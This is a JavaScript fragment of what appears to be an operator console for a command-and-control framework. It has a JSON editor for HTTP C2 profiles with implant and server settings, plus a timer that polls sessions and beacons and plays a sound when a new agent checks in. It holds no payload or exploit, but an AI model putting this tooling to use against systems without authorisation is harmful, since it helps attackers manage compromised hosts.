  let currentProfileName = null;

  // Load profile into editor
  async function loadProfile(name) {
    status.textContent = 'Loading...';
    const json = await App().GetHTTPC2Profile(name).catch(e => null);
    if (!json) { status.textContent = 'Failed to load profile'; return; }
    editor.value = json;
    currentProfileName = name;
    activeName.textContent = name;
    status.textContent = `Loaded: ${name}`;
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.toggle('active', el.dataset.name === name));
  }

  document.querySelectorAll('.c2p-item').forEach(el => {
    el.addEventListener('click', () => loadProfile(el.dataset.name));
  });

  document.getElementById('c2-save-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = 'Editor is empty'; return; }
    status.textContent = 'Saving...';
    const err = await App().SaveHTTPC2Profile(json, true).catch(e => e.toString());
    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
    status.textContent = 'Saved!';
    toast('ok', 'C2 profile saved (overwrite)');
  });

  document.getElementById('c2-save-new-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = 'Editor is empty'; return; }
    status.textContent = 'Saving as new...';
    const err = await App().SaveHTTPC2Profile(json, false).catch(e => e.toString());
    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
    status.textContent = 'Saved as new profile!';
    toast('ok', 'New C2 profile created');
    openC2ProfileEditor(); // refresh list
  });

  document.getElementById('c2-new-btn')?.addEventListener('click', () => {
    editor.value = JSON.stringify({ name: 'new-profile', implantConfig: {}, serverConfig: {} }, null, 2);
    currentProfileName = null;
    activeName.textContent = 'New Profile';
    status.textContent = 'Edit JSON and click "Save as New"';
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.remove('active'));
  });
}

// Wire up sound & count check interval
if (typeof window !== 'undefined') {
  let lastAgentCount = 0;
  setInterval(async () => {
    try {
      const sessions = await App().ListSessions().catch(() => []);
      const beacons = await App().ListBeacons().catch(() => []);
      const total = (sessions?.length || 0) + (beacons?.length || 0);
      if (total > lastAgentCount && lastAgentCount > 0) {
        playBeaconSound();
      }
      lastAgentCount = total;
    } catch(e) {}
  }, 5000);
}

